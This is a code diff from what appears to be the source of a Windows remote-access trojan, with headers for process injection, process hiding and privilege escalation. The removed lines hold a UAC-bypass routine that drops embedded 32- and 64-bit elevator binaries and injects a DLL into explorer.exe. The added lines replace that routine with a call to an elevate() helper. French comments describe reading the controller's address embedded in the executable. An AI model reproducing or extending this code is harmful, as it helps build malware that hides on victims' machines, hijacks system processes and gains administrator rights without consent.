@@ -1,30 +1,27 @@
-#include <windows.h>
-#include <string>
-#include <cstdlib>
-
-#include <ElevatorDll32.hpp>
-#include <ElevatorDll64.hpp>
-#include <Elevator32.hpp>
-#include <Elevator64.hpp>
-
-#include "Inhibiter.hpp"
-#include "ClientConfig.hpp"
 #include <blaspheme/Blaspheme.hpp>
 #include <common/Log.hpp>
+
+#include "ClientConfig.hpp"
+#include "Inhibiter.hpp"
+using namespace Inhibiter;
+
 #include <malicious/Injector.hpp>
 #include <malicious/ProcessHider.hpp>
 #include <malicious/BinaryRessource.hpp>
+#include <malicious/Elevator.hpp>
+using namespace Malicious;
+
 #include <system/Uac.hpp>
 #include <system/ThisProcess.hpp>
 #include <system/System.hpp>
 #include <system/ProcessManager.hpp>
 #include <system/File.hpp>
-
-using namespace std;
 using namespace System;
-using namespace Network;
-using namespace Inhibiter;
-using namespace Malicious;
+
+#include <windows.h>
+#include <string>
+#include <cstdlib>
+using namespace std;
 
 void ExecuteCommand(InhibiterCore& injector, const string& command);
 void Inject(InhibiterCore& injector, const string& inhibitorPath);
@@ -34,26 +31,17 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     FUNC_LOG(__FUNCTION__);
 	ThisProcess thisProcess;
 
+#ifdef INNOCENCE_DEBUG
 	// le nom du programme doit apparaitre dans les messages de debug
     LOG.setHeader(thisProcess.getProgramName());
     
     // les informations de connexions vers le serveur se trouvent dans une chaine de 
     // caractere avec un certain format située dans l'exécutable
 	// on va parser les infos de connexions à partir de la chaine
-    /*
-	string buffer = blaspheme;
-    string ip_str;
-    string port_str;
-    buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
-    istringstream iss(buffer);
-    getline( iss, ip_str, SEPERATOR );
-    getline( iss, port_str, SEPERATOR );
-    Port port = 0;
-    from_string(port_str, port);
     
-    LOG.addObserver(new Common::LogToNetwork(ip_str, port));
-	*/
 	LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+#endif
+
     InhibiterCore injector (thisProcess.getProgramPath());
     LOG << "Program path : " + thisProcess.getProgramPath();
     LOG << "Arguments count : " + to_string(thisProcess.getArgCount());
@@ -133,68 +121,18 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
 void Inject(InhibiterCore& injector, const string& inhibitorPath)
 {
     FUNC_LOG(__FUNCTION__);
-	// soit le programme est lance une premiere fois
-	LOG << "Identifying operating system";
-	switch(getSystemVersion())
+	if(!isAdministrator())
 	{
-		case OS_WIN32_WINDOWS_VISTA:
-			if(isUacActivated())
-			{
-				if(!isAdministrator())
-				{
-					LOG << "Privilege escalation is not supported on Windows Vista";
-					return;
-				}
-			}
-			break;
-		case OS_WIN32_WINDOWS_SEVEN:
-			if(isUacActivated())
-			{
-				if(!isAdministrator())
-				{
-                    string currentPath = inhibitorPath;
-	                System::GetFileDir(currentPath);
-					LOG << "You're not administrator, trying privilege escalation";
-
-					BinaryRessource * elevatorDll = 0;
-					BinaryRessource * elevator = 0;
-
-					if(is64BitWindows())
-					{
-						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
-						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
-					}
-					else
-					{
-						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
-						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
-					}
-
-					LOG << "What is explorer.exe PID ?";
-					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
-					if(explorer_pid)
-					{
-						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
-						string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + inhibitorPath;
-						LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
-						
-						Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
-						elevatorProcess.wait();				
-					}
-					else
-					{
-						LOG << "Process explorer does not exist, unable to inject";
-					}
-					delete elevatorDll;
-					delete elevator;
-					return;
-				}
-			}
-		default:
-			LOG << "You are administrator";
+		if(elevate(inhibitorPath) == EXIT_SUCCESS)
+		{
+			LOG << "Privilege escalation passed";
+		}
+		else
+		{
+			LOG << "Privilege escalation failed";
+		}
 	}
-
-	if(injector.installed())
+	else if(injector.installed())
 	{
 		LOG << "Injecting";
 		injector.inject();
